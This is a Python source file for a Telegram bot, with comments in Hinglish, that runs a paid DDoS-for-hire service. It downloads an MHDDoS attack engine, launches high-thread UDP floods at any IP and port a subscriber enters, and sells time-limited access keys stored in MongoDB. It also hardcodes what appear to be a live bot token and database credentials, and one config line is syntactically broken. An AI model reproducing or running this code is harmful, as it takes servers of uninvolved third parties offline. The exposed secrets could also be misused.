import telebot
import subprocess
import threading
import time
import random
import os
from telebot import types
from datetime import datetime, timedelta
from pymongo import MongoClient

# --- CONFIG ---
# Tera Token aur MongoDB URL maine fix kar diya hai
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
MONGO_URL = Gmongodb+srv://riderbhai:<riderbhai321>@cluster0.yvrweeu.mongodb.net/?appName=Cluster
ADMIN_ID = 6075779781 
bot = telebot.TeleBot(TOKEN)

# --- MONGODB CONNECTION ---
try:
    # timeout 5 second rakha hai taaki bot jaldi error pakad sake
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    db = client['RiderBot']
    users_col = db['users']
    keys_col = db['keys']
    client.admin.command('ping')
    print("✅ MongoDB Connected Successfully!")
except Exception as e:
    print(f"❌ MongoDB Connection Error: {e}")

# --- ATTACK ENGINE DOWNLOAD ---
# Railway par engine apne aap download ho jayega
if not os.path.exists("MHDDoS"):
    print("📡 Downloading Attack Engine...")
    os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")

# --- HELPERS ---
def get_progress_bar(percent):
    bar_length = 10
    filled = int(percent / 10)
    return "🔵" * filled + "⚪" * (bar_length - filled)

# --- ATTACK ENGINE LOGIC ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    threads = random.randint(1100, 1600)
    # MHDDoS command
    command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
    
    try:
        process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = int(duration - elapsed)
            percent = min(100, int((elapsed / duration) * 100))
            bar = get_progress_bar(percent)
            
            try:
                bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id,
                    text=(f"⚡ **VVIP ATTACK ACTIVE** ⚡\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"👤 **User:** `@{username}`\n"
                          f"🎯 **Target:** `{ip}:{port}`\n"
                          f"⏳ **Time:** `{remaining}s` / `{duration}s`\n"
                          f"📊 **Power:** `{bar} {percent}%` \n"
                          f"🛡️ **Anti-Ban:** `BYPASS ON ✅`\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━"),
                    parse_mode="Markdown"
                )
            except: pass
            time.sleep(4)
        
        process.terminate()
        bot.send_message(chat_id, f"🔥 **SERVER DOWN!**\n\nTarget `{ip}` was successfully frozen. ✅")
    except Exception as e:
        print(f"Error: {e}")

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🚀 VVIP Attack', '👤 My Info', '🔑 Redeem Key')
    return markup

# --- COMMAND HANDLERS ---

@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    
    # Admin ya Valid User check
    is_valid = False
    if user_id == ADMIN_ID:
        is_valid = True
    elif user_data:
        expiry = datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S')
        if expiry > datetime.now():
            is_valid = True

    if is_valid:
        bot.send_message(m.chat.id, f"👑 **Welcome Legend @{m.from_user.username}!**\nSystem Ready Hai.", reply_markup=main_menu())
    else:
        bot.send_message(m.chat.id, f"🚫 **Access Denied!**\nContact Admin for Key: @FLEXOP01")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        days = int(m.text.split()[1])
        key = f"VVIP-{random.randint(1000, 9999)}"
        keys_col.insert_one({"key": key, "days": days})
        bot.reply_to(m, f"🔑 **KEY GENERATED:**\n\n`/redeem {key}`\n\n**Validity:** {days} Days", parse_mode="Markdown")
    except: 
        bot.reply_to(m, "⚠️ Format: `/genkey 1`")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = m.from_user.id
    args = m.text.split()
    if len(args) < 2:
        bot.reply_to(m, "❌ Format: `/redeem VVIP-XXXX`")
        return
        
    key_text = args[1]
    key_data = keys_col.find_one({"key": key_text})
    
    if key_data:
        days = key_data['days']
        expiry = datetime.now() + timedelta(days=days)
        users_col.update_one({"user_id": user_id}, {"$set": {"expiry": expiry.strftime('%Y-%m-%d %H:%M:%S')}}, upsert=True)
        keys_col.delete_one({"key": key_text})
        bot.reply_to(m, f"🎉 **Access Granted!**\n\nDays: `{days}`\nExpiry: `{expiry.strftime('%Y-%m-%d')}`")
    else:
        bot.reply_to(m, "❌ Invalid ya Expired Key!")

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    
    # Authorization Check
    is_auth = False
    if user_id == ADMIN_ID: is_auth = True
    elif user_data and datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now(): is_auth = True

    if not is_auth:
        bot.reply_to(m, "❌ No Active Subscription!")
        return

    try:
        p = m.text.split()
        if len(p) < 4:
            bot.reply_to(m, "❌ Format: `/attack <IP> <PORT> <TIME>`")
            return
        
        sent = bot.reply_to(m, "📡 **Bypassing Server Security...**")
        threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
    except: pass

@bot.message_handler(func=lambda m: m.text == '🚀 VVIP Attack')
def attack_button(m):
    bot.reply_to(m, "🚀 **Command Format:**\n`/attack <IP> <PORT> <TIME>`\n\nExample: `/attack 1.1.1.1 8080 60`")

@bot.message_handler(func=lambda m: m.text == '👤 My Info')
def my_info(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    status = "Active ✅" if (user_data or user_id == ADMIN_ID) else "Expired ❌"
    bot.reply_to(m, f"👤 **USER INFO**\n\n🆔 ID: `{user_id}`\n📊 Status: {status}")

# --- START BOT ---
print("🚀 Bot is starting...")
bot.infinity_polling()
          
